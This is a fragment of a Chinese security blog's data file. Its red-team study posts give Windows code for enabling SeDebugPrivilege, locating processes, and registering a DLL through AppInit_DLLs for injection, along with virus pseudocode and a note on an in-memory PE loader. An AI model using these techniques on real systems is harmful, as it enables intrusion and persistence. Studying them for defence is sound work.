class=\"headerlink\" title=\"提权操作\"></a>提权操作</h3><h4 id=\"令牌方式\"><a href=\"#令牌方式\" class=\"headerlink\" title=\"令牌方式\"></a>令牌方式</h4><pre><code class=\"c++\">// 传入参数 SeDebugPrivilege，提升到调试权限\n\nBOOL GrantPriviledge(WCHAR* PriviledgeName)\n{\n    TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;\n    DWORD             dwReturnLength = sizeof(OldPrivileges);\n    HANDLE             TokenHandle = NULL;\n    LUID             uID;\n\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &amp;TokenHandle))\n    {\n        if (GetLastError() != ERROR_NO_TOKEN)\n        {\n            return FALSE;\n        }\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle))\n        {\n            return FALSE;\n        }\n    }\n\n    if (!LookupPrivilegeValue(NULL, PriviledgeName, &amp;uID))        // 通过权限名称查找uID\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数\n    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    TokenPrivileges.Privileges[0].Luid = uID;\n\n    if (!AdjustTokenPrivileges(TokenHandle, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &amp;OldPrivileges, &amp;dwReturnLength))\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    CloseHandle(TokenHandle);\n    cout&lt;&lt; &quot;[+] AdjustTokenPrivileges to SeDebugPrivilege Success!&quot; &lt;&lt; endl;\n    return TRUE;\n}\n</code></pre>\n<h4 id=\"RtlAdjustPrivilege\"><a href=\"#RtlAdjustPrivilege\" class=\"headerlink\" title=\"RtlAdjustPrivilege\"></a>RtlAdjustPrivilege</h4><pre><code class=\"c++\">// 传入参数 SE_DEBUG_PRIVILEGE，提升到调试权限\n\n#define SE_DEBUG_PRIVILEGE                (20L)\n\ntypedef\nNTSTATUS(NTAPI * pfnRtlAdjustPrivilege)(\n    UINT32 Privilege,\n    BOOLEAN Enable,\n    BOOLEAN Client,\n    PBOOLEAN WasEnabled);\n\nBOOL GrantPriviledge(IN UINT32 Priviledge)\n{\n    pfnRtlAdjustPrivilege    RtlAdjustPrivilege = NULL;\n    BOOLEAN                    WasEnable = FALSE;\n\n    RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;RtlAdjustPrivilege&quot;);\n    if (RtlAdjustPrivilege == NULL)\n    {\n        return FALSE;\n    }\n\n    RtlAdjustPrivilege(Priviledge, TRUE, FALSE, &amp;WasEnable);\n\n    return TRUE;\n}\n\nRtlAdjustPrivilege</code></pre>\n<h3 id=\"进程线程镜像\"><a href=\"#进程线程镜像\" class=\"headerlink\" title=\"进程线程镜像\"></a>进程线程镜像</h3><pre><code class=\"c++\">// 使用ToolHelp系列函数\n\n#include &lt;TlHelp32.h&gt;\n\nBOOL GetProcessIdByProcessImageName(IN PWCHAR wzProcessImageName, OUT PUINT32 ProcessId)\n{\n    HANDLE            ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n    PROCESSENTRY32    ProcessEntry32 = { 0 };\n\n    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);        // 初始化PROCESSENTRY32结构\n\n    ProcessSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 给系统所有的进程快照\n    if (ProcessSnapshotHandle == INVALID_HANDLE_VALUE)\n    {\n        return FALSE;\n    }\n\n    if (Process32First(ProcessSnapshotHandle, &amp;ProcessEntry32))        // 找到第一个\n    {\n        do\n        {\n            if (lstrcmpi(ProcessEntry32.szExeFile, wzProcessImageName) == 0)        // 不区分大小写\n            {\n                *ProcessId = ProcessEntry32.th32ProcessID;\n                break;\n            }\n        } while (Process32Next(ProcessSnapshotHandle, &amp;ProcessEntry32));\n    }\n\n    CloseHandle(ProcessSnapshotHandle);\n    ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n\n    if (*ProcessId == 0)\n    {\n        return FALSE;\n    }\n    return TRUE;\n}\n\n</code></pre>\n<h3 id=\"注册表\"><a href=\"#注册表\" class=\"headerlink\" title=\"注册表\"></a>注册表</h3><pre><code class=\"c++\">int main()\n{\n    LSTATUS Status = 0;\n#ifdef _WIN64\n    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;;\n#else\n    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;;\n#endif // _WIN64\n\n    HKEY    hKey = NULL;\n\n    // 打开注册表\n    Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,        // 要打开的主键\n        wzSubKey,            // 要打开的子键名字地址\n        0,                    // 保留，传0\n        KEY_ALL_ACCESS,        // 打开的方式\n        &amp;hKey);                // 返回的子键句柄\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    WCHAR*    wzValueName = L&quot;AppInit_DLLs&quot;;\n    DWORD    dwValueType = 0;\n    UINT8    ValueData[MAX_PATH] = { 0 };\n    DWORD    dwReturnLength = 0;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey,        // 子键句柄\n        wzValueName,        // 待查询键值的名称\n        NULL,                // 保留\n        &amp;dwValueType,        // 数据类型\n        ValueData,            // 键值\n        &amp;dwReturnLength);\n\n\n    WCHAR    wzDllFullPath[MAX_PATH] = { 0 };\n    GetCurrentDirectoryW(MAX_PATH, wzDllFullPath);\n\n#ifdef _WIN64\n    wcscat_s(wzDllFullPath, L&quot;\\\\x64NormalDll.dll&quot;);\n#else\n    wcscat_s(wzDllFullPath, L&quot;\\\\x86NormalDll.dll&quot;);\n#endif\n\n    // 设置键值\n    Status = RegSetValueExW(hKey,\n        wzValueName,\n        NULL,\n        dwValueType,\n        (CONST BYTE*)wzDllFullPath,\n        (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    wzValueName = L&quot;LoadAppInit_DLLs&quot;;\n    DWORD    dwLoadAppInit = 1;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n\n    // 设置键值\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    printf(&quot;Input Any Key To Resume\\r\\n&quot;);\n\n    getchar();\n    getchar();\n\n    // 恢复键值\n    dwLoadAppInit = 0;\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));\n\n    wzValueName = L&quot;AppInit_DLLs&quot;;\n    ZeroMemory(wzDllFullPath, (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)wzDllFullPath, 0);\n\n\n    return 0;\n}</code></pre>\n"},{"title":"基于C#的PEloder","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-g8k8yq.jpg","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-g8k8yq.jpg","date":"2020-03-24T16:00:00.000Z","_content":"\n使用C#的pe加载器可以很方便的生成和修改，代码可变性较高，可在被目标机中编译生成\n\n思路来源：Casey Smith，GhostPack  和 3student\n\n###  C#PE加载\n\nCasey Smith提供的方案有两种加载方式\n\n1.`public PELoader(string filePath)`\n\n2.`public PELoader(byte[] fileBytes)`\n\n方法1 可以直接加载运行一个本地的可执行程序\n\n方法2 则是可以直接执行内存中的可运行程序的流数据\n\n代码见：\n\nhttps://gitee.com/L0yy/Cshap/blob/master/PEloader.cs\n\n### 改良\n\n经过测试，上述代码只能加载64位的PE。\n\n通过3student的改良，将64位版本中的Opheader结构修改位32位的\n\n\n\n拷贝一份学习\n\nhttps://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs\n\n其他代码整合见\n\nhttps://gitee.com/L0yy/Cshap","source":"_posts/基于C#的PEloder.md","raw":"---\ntitle: 基于C#的PEloder\ntags: [C#,RedTeam]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-g8k8yq.jpg\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-g8k8yq.jpg\ndate: 2020-3-25\n---\n\n使用C#的pe加载器可以很方便的生成和修改，代码可变性较高，可在被目标机中编译生成\n\n思路来源：Casey Smith，GhostPack  和 3student\n\n###  C#PE加载\n\nCasey Smith提供的方案有两种加载方式\n\n1.`public PELoader(string filePath)`\n\n2.`public PELoader(byte[] fileBytes)`\n\n方法1 可以直接加载运行一个本地的可执行程序\n\n方法2 则是可以直接执行内存中的可运行程序的流数据\n\n代码见：\n\nhttps://gitee.com/L0yy/Cshap/blob/master/PEloader.cs\n\n### 改良\n\n经过测试，上述代码只能加载64位的PE。\n\n通过3student的改良，将64位版本中的Opheader结构修改位32位的\n\n\n\n拷贝一份学习\n\nhttps://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs\n\n其他代码整合见\n\nhttps://gitee.com/L0yy/Cshap","slug":"基于C#的PEloder","published":1,"updated":"2020-03-31T10:44:34.083Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw635001sccuqvt54tk5r","content":"<p>使用C#的pe加载器可以很方便的生成和修改，代码可变性较高，可在被目标机中编译生成</p>\n<p>思路来源：Casey Smith，GhostPack  和 3student</p>\n<h3 id=\"C-PE加载\"><a href=\"#C-PE加载\" class=\"headerlink\" title=\"C#PE加载\"></a>C#PE加载</h3><p>Casey Smith提供的方案有两种加载方式</p>\n<p>1.<code>public PELoader(string filePath)</code></p>\n<p>2.<code>public PELoader(byte[] fileBytes)</code></p>\n<p>方法1 可以直接加载运行一个本地的可执行程序</p>\n<p>方法2 则是可以直接执行内存中的可运行程序的流数据</p>\n<p>代码见：</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs</a></p>\n<h3 id=\"改良\"><a href=\"#改良\" class=\"headerlink\" title=\"改良\"></a>改良</h3><p>经过测试，上述代码只能加载64位的PE。</p>\n<p>通过3student的改良，将64位版本中的Opheader结构修改位32位的</p>\n<p>拷贝一份学习</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs</a></p>\n<p>其他代码整合见</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>使用C#的pe加载器可以很方便的生成和修改，代码可变性较高，可在被目标机中编译生成</p>\n<p>思路来源：Casey Smith，GhostPack  和 3student</p>\n<h3 id=\"C-PE加载\"><a href=\"#C-PE加载\" class=\"headerlink\" title=\"C#PE加载\"></a>C#PE加载</h3><p>Casey Smith提供的方案有两种加载方式</p>\n<p>1.<code>public PELoader(string filePath)</code></p>\n<p>2.<code>public PELoader(byte[] fileBytes)</code></p>\n<p>方法1 可以直接加载运行一个本地的可执行程序</p>\n<p>方法2 则是可以直接执行内存中的可运行程序的流数据</p>\n<p>代码见：</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap/blob/master/PEloader.cs</a></p>\n<h3 id=\"改良\"><a href=\"#改良\" class=\"headerlink\" title=\"改良\"></a>改良</h3><p>经过测试，上述代码只能加载64位的PE。</p>\n<p>通过3student的改良，将64位版本中的Opheader结构修改位32位的</p>\n<p>拷贝一份学习</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap/blob/master/SharpPELoaderGenerater.cs</a></p>\n<p>其他代码整合见</p>\n<p><a href=\"https://gitee.com/L0yy/Cshap\" target=\"_blank\" rel=\"noopener\">https://gitee.com/L0yy/Cshap</a></p>\n"},{"title":"替换特权指令 提升权限","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102250.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102250.png","date":"2019-09-03T11:11:22.000Z","_content":"\n**[什么是特权](https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows))**\n\n**注意，这里说的提权不是从`Administrator `提升到 `System`,只是开启一些`Administrator`组的特殊权限**\n\n**查看用户组信息使用命令 `whoami /all`**\n\n\n### Administrator组\n管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是`SeDebugPrivilege`，要是进程拥有了这个权限，就能对任意进程进行操作（包括`system`）\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905184130154.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905190534272.png)\n>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。\n\n我要做的就是找到找到一个系统中有`SeDebugPrivilege`权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了`SeDebugPrivilege`权限了。这也就是提升权限的核心。\n\n\n\n下图是我使用 `OpenProcess`对SID为4的系统进程进行操作，且操作权限是`PROCESS_ALL_ACCESS`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905190019240.png)\n\n\n下面看看具体实现\n\n\n```c\nvoid CgPivilige()\n{\n\tBOOL retn;\n\tHANDLE hToken;\n\tretn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &hToken);//修改令牌特权值\n\tif (retn != TRUE)\n\t{\n\t\tprintf(\"获取令牌句柄失败!\" );\n\t\treturn;\n\t}\n\n\tTOKEN_PRIVILEGES tp; //新特权结构体\n\tLUID Luid;\n\tretn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);//查看具有调试权限的令牌\n\n\tif (retn != TRUE)\n\t{\n\t\tprintf(\"获取Luid失败\" );\n\t\treturn;\n\t}\n\t//给TP和TP里的LUID结构体赋值\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = Luid;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n\tAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token\n\tif (GetLastError() != ERROR_SUCCESS)\n\t{\n\t\tprintf(\"修改特权不完全或失败!\" );\n\t}\n\telse\n\t{\n\t\tprintf(\"修改成功!\" );\n\t}\n}\n```\n\n下面给一个病毒使用的提升权限 IDA伪代码\n```\nint __cdecl reloadToken_4108F0(LPCWSTR lpName)\n{\n  HANDLE v2; // eax\n  struct _LUID Luid; // [esp+0h] [ebp-24h]\n  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]\n  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]\n\n  if ( !LookupPrivilegeValueW(0, lpName, &Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌\n    return 0;\n  v2 = GetCurrentProcess();\n  if ( !OpenProcessToken(v2, 0x20028u, &TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL\n    return 0;\n  NewState.Privileges[0].Luid = Luid;\n  NewState.PrivilegeCount = 1;\n  NewState.Privileges[0].Attributes = 2;\n  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升\n  CloseHandle(TokenHandle);\n  return 1;\n}\n```\n\n\n### 普通用户组\n普通用户组本身权限就比较少\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905175911142.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905183658642.png)\nCrat是普通用户组成员\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905191224944.png)\n普通用户一般是没有`SeDebugPrivilege` 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。\n\n所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。\n\n\n#### 查看进程权限\n程序能运行在`low` `medium` `hight ` 三个level下,那怎么在通过代码检测自己拥有什么权限呢？\n\n通过`GetTokenInformation`拿到这个进程的`TokenInformation`信息 再通过比较`Label.Sid,`的值\n```c\nvoid ShowProcessIntegrityLevel()\n{\n\tHANDLE hToken;\n\tHANDLE hProcess;\n\n\tDWORD dwLengthNeeded;\n\tDWORD dwError = ERROR_SUCCESS;\n\n\tPTOKEN_MANDATORY_LABEL pTIL = NULL;\n\tDWORD dwIntegrityLevel;\n\n\thProcess = GetCurrentProcess();\n\tif (OpenProcessToken(hProcess, TOKEN_QUERY |\n\t\tTOKEN_QUERY_SOURCE, &hToken))\n\t{\n\t\t// Get the Integrity level.\n\t\tif (!GetTokenInformation(hToken, TokenIntegrityLevel,\n\t\t\tNULL, 0, &dwLengthNeeded))\n\t\t{\n\t\t\tdwError = GetLastError();\n\t\t\tif (dwError == ERROR_INSUFFICIENT_BUFFER)\n\t\t\t{\n\t\t\t\tpTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,\n\t\t\t\t\tdwLengthNeeded);\n\t\t\t\tif (pTIL != NULL)\n\t\t\t\t{\n\t\t\t\t\tif (GetTokenInformation(hToken, TokenIntegrityLevel,\n\t\t\t\t\t\tpTIL, dwLengthNeeded, &dwLengthNeeded))\n\t\t\t\t\t{\n\t\t\t\t\t\tdwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,\n\t\t\t\t\t\t\t(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// Low Integrity\n\t\t\t\t\t\t\twprintf(L\"Low Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&\n\t\t\t\t\t\t\tdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// Medium Integrity\n\t\t\t\t\t\t\twprintf(L\"Medium Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// High Integrity\n\t\t\t\t\t\t\twprintf(L\"High Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tLocalFree(pTIL);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hToken);\n\t}\n}\n```\n\n参考  https://www.cnblogs.chom/hqu-ye/articles/4838381.html\n","source":"_posts/替换特权指令 提升权限.md","raw":"---\ntitle: 替换特权指令 提升权限\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102250.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102250.png\ndate: 2019-09-03 19:11:22\ntags:\n    - 提权\ncategories: 逆向\n---\n\n**[什么是特权](https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows))**\n\n**注意，这里说的提权不是从`Administrator `提升到 `System`,只是开启一些`Administrator`组的特殊权限**\n\n**查看用户组信息使用命令 `whoami /all`**\n\n\n### Administrator组\n管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是`SeDebugPrivilege`，要是进程拥有了这个权限，就能对任意进程进行操作（包括`system`）\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905184130154.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905190534272.png)\n>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。\n\n我要做的就是找到找到一个系统中有`SeDebugPrivilege`权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了`SeDebugPrivilege`权限了。这也就是提升权限的核心。\n\n\n\n下图是我使用 `OpenProcess`对SID为4的系统进程进行操作，且操作权限是`PROCESS_ALL_ACCESS`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905190019240.png)\n\n\n下面看看具体实现\n\n\n```c\nvoid CgPivilige()\n{\n\tBOOL retn;\n\tHANDLE hToken;\n\tretn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &hToken);//修改令牌特权值\n\tif (retn != TRUE)\n\t{\n\t\tprintf(\"获取令牌句柄失败!\" );\n\t\treturn;\n\t}\n\n\tTOKEN_PRIVILEGES tp; //新特权结构体\n\tLUID Luid;\n\tretn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);//查看具有调试权限的令牌\n\n\tif (retn != TRUE)\n\t{\n\t\tprintf(\"获取Luid失败\" );\n\t\treturn;\n\t}\n\t//给TP和TP里的LUID结构体赋值\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = Luid;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n\tAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token\n\tif (GetLastError() != ERROR_SUCCESS)\n\t{\n\t\tprintf(\"修改特权不完全或失败!\" );\n\t}\n\telse\n\t{\n\t\tprintf(\"修改成功!\" );\n\t}\n}\n```\n\n下面给一个病毒使用的提升权限 IDA伪代码\n```\nint __cdecl reloadToken_4108F0(LPCWSTR lpName)\n{\n  HANDLE v2; // eax\n  struct _LUID Luid; // [esp+0h] [ebp-24h]\n  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]\n  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]\n\n  if ( !LookupPrivilegeValueW(0, lpName, &Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌\n    return 0;\n  v2 = GetCurrentProcess();\n  if ( !OpenProcessToken(v2, 0x20028u, &TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL\n    return 0;\n  NewState.Privileges[0].Luid = Luid;\n  NewState.PrivilegeCount = 1;\n  NewState.Privileges[0].Attributes = 2;\n  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升\n  CloseHandle(TokenHandle);\n  return 1;\n}\n```\n\n\n### 普通用户组\n普通用户组本身权限就比较少\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905175911142.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905183658642.png)\nCrat是普通用户组成员\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905191224944.png)\n普通用户一般是没有`SeDebugPrivilege` 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。\n\n所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。\n\n\n#### 查看进程权限\n程序能运行在`low` `medium` `hight ` 三个level下,那怎么在通过代码检测自己拥有什么权限呢？\n\n通过`GetTokenInformation`拿到这个进程的`TokenInformation`信息 再通过比较`Label.Sid,`的值\n```c\nvoid ShowProcessIntegrityLevel()\n{\n\tHANDLE hToken;\n\tHANDLE hProcess;\n\n\tDWORD dwLengthNeeded;\n\tDWORD dwError = ERROR_SUCCESS;\n\n\tPTOKEN_MANDATORY_LABEL pTIL = NULL;\n\tDWORD dwIntegrityLevel;\n\n\thProcess = GetCurrentProcess();\n\tif (OpenProcessToken(hProcess, TOKEN_QUERY |\n\t\tTOKEN_QUERY_SOURCE, &hToken))\n\t{\n\t\t// Get the Integrity level.\n\t\tif (!GetTokenInformation(hToken, TokenIntegrityLevel,\n\t\t\tNULL, 0, &dwLengthNeeded))\n\t\t{\n\t\t\tdwError = GetLastError();\n\t\t\tif (dwError == ERROR_INSUFFICIENT_BUFFER)\n\t\t\t{\n\t\t\t\tpTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,\n\t\t\t\t\tdwLengthNeeded);\n\t\t\t\tif (pTIL != NULL)\n\t\t\t\t{\n\t\t\t\t\tif (GetTokenInformation(hToken, TokenIntegrityLevel,\n\t\t\t\t\t\tpTIL, dwLengthNeeded, &dwLengthNeeded))\n\t\t\t\t\t{\n\t\t\t\t\t\tdwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,\n\t\t\t\t\t\t\t(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// Low Integrity\n\t\t\t\t\t\t\twprintf(L\"Low Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&\n\t\t\t\t\t\t\tdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// Medium Integrity\n\t\t\t\t\t\t\twprintf(L\"Medium Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// High Integrity\n\t\t\t\t\t\t\twprintf(L\"High Integrity Process\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tLocalFree(pTIL);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hToken);\n\t}\n}\n```\n\n参考  https://www.cnblogs.chom/hqu-ye/articles/4838381.html\n","slug":"替换特权指令 提升权限","published":1,"updated":"2019-12-17T02:25:52.536Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw636001uccuq0atk7ppq","content":"<p><strong><a href=\"https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows)\" target=\"_blank\" rel=\"noopener\">什么是特权</a></strong></p>\n<p><strong>注意，这里说的提权不是从<code>Administrator</code>提升到 <code>System</code>,只是开启一些<code>Administrator</code>组的特殊权限</strong></p>\n<p><strong>查看用户组信息使用命令 <code>whoami /all</code></strong></p>\n<h3 id=\"Administrator组\"><a href=\"#Administrator组\" class=\"headerlink\" title=\"Administrator组\"></a>Administrator组</h3><p>管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是<code>SeDebugPrivilege</code>，要是进程拥有了这个权限，就能对任意进程进行操作（包括<code>system</code>）</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905184130154.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905190534272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<blockquote>\n<p>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。</p>\n</blockquote>\n<p>我要做的就是找到找到一个系统中有<code>SeDebugPrivilege</code>权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了<code>SeDebugPrivilege</code>权限了。这也就是提升权限的核心。</p>\n<p>下图是我使用 <code>OpenProcess</code>对SID为4的系统进程进行操作，且操作权限是<code>PROCESS_ALL_ACCESS</code></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905190019240.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>下面看看具体实现</p>\n<pre><code class=\"c\">void CgPivilige()\n{\n    BOOL retn;\n    HANDLE hToken;\n    retn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &amp;hToken);//修改令牌特权值\n    if (retn != TRUE)\n    {\n        printf(&quot;获取令牌句柄失败!&quot; );\n        return;\n    }\n\n    TOKEN_PRIVILEGES tp; //新特权结构体\n    LUID Luid;\n    retn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid);//查看具有调试权限的令牌\n\n    if (retn != TRUE)\n    {\n        printf(&quot;获取Luid失败&quot; );\n        return;\n    }\n    //给TP和TP里的LUID结构体赋值\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Luid = Luid;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n    AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token\n    if (GetLastError() != 